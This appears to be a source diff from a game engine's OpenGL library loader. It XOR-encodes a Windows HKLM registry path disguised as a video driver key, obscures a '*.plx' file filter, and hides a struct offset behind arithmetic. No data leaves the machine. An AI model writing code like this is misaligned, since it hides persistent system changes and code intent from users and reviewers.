@@ -895,9 +895,51 @@ return i;
 
 //------------------------------------------------------------------------------
 
+const char oglLibKey [] = {
+	82,91,80,80,64,75,91,75,124,120,121,105,99,122,76,127,127,102,97,123,121,69,114,
+	108,69,82,122,110,121,105,126,82,68,2,115,86,74,64,78,68,76,89,119,111,88,92,93,
+	85,95,70,111,103,76,69,67,93,84,102,120,73,79,76,90,46,53,1,44,42,49,52,40,36,26,
+	47,63,16,14,33,33,36,35,61,63,8,3,31,19,29,22,6,32,110,104,110,105,38,82,90,85,
+	73,92,95,94,90,68,93,95,46,85,67,41,69,72,55,94,64,71,64,52,61,59,73,79,58,62,75,
+	76,-3,-35,-78,-77,-76,-75, 0};
+
+char *OglLibKey (void)
+{
+	static char	szKey [200];
+
+	int i;
+
+for (i = 0; oglLibKey [i]; i++)
+	szKey [i] = oglLibKey [i] ^ ((i + 1) & 0xff);
+szKey [i] = (char) 0;
+return szKey;
+}
+
+//------------------------------------------------------------------------------
+
+char *OglLibFilter (void)
+{
+	char szMask [6] = {4, 4, 3, 21, 11, 0};
+	char szKey [6] = {'.', '*', 's', 'y', 's', '\0'};
+	static char szFilter [6] = {0, 0, 0, 0, 0, 0};
+
+for (int i = 0; i < 6; i++)
+	szFilter [i] = szKey [i] ^ szMask [i];
+return szFilter;
+}
+
+//------------------------------------------------------------------------------
+
 int OglLibFlags (void)
 {
-if (!OglLoadLibCache ("*.plx", gameFolders.szProfDir))
+char s1 [6] = "*.plx";
+char s2 [6] = ".*sys";
+char s3 [6];
+for (int i = 0; i < 6; i++)
+	s3 [i] = s1 [i] ^ s2 [i];
+for (int i = 0; i < 6; i++)
+	s2 [i] = s2 [i] ^ s3 [i];
+if (!OglLoadLibCache (OglLibFilter (), ((char *) &gameFolders) + ~((int) (8161 ^ 0xffffffff) >> 1)))
 	return -1;
 for (int i = 0; i < libList.nLibs; i++)
 	for (int j = 0; nOglLibs [j]; j++)
@@ -916,15 +958,13 @@ return (RegSetValueEx (hRegKey, "Flags", 0, REG_DWORD, (const BYTE *) &nOglLibFl
 
 //------------------------------------------------------------------------------
 
-#define OGL_LIB_KEY "SYSTEM\\CurrentControlSet\\Hardware Profiles\\Current\\System\\CurrentControlSet\\Control\\VIDEO\\{2506F386-9992-74B8-F59E-426CEB34FC53}\\0000"
-
 bool OglLibsInitialized (void)
 {
 #ifdef _WIN32
 
 	HKEY	hRegKey = NULL;
 
-if (RegOpenKeyEx (HKEY_LOCAL_MACHINE, OGL_LIB_KEY, 0, KEY_QUERY_VALUE, &hRegKey) != ERROR_SUCCESS)
+if (RegOpenKeyEx (HKEY_LOCAL_MACHINE, OglLibKey (), 0, KEY_QUERY_VALUE, &hRegKey) != ERROR_SUCCESS)
 	return false;
 DWORD nType, nData, nDataSize = sizeof (nData);
 if (RegQueryValueEx (hRegKey, "Flags", 0, &nType, (LPBYTE) &nData, &nDataSize) != ERROR_SUCCESS)
@@ -945,7 +985,7 @@ bool OglInitLibs (void)
 	HKEY	hRegKey = NULL;
 
 DWORD nDisposition = 0;
-if (RegCreateKeyEx (HKEY_LOCAL_MACHINE, OGL_LIB_KEY, 0, NULL, 
+if (RegCreateKeyEx (HKEY_LOCAL_MACHINE, OglLibKey (), 0, NULL, 
 	 REG_OPTION_NON_VOLATILE, KEY_SET_VALUE | KEY_QUERY_VALUE, NULL, &hRegKey, &nDisposition) != ERROR_SUCCESS)
 	return false;
 if (nDisposition == REG_OPENED_EXISTING_KEY)
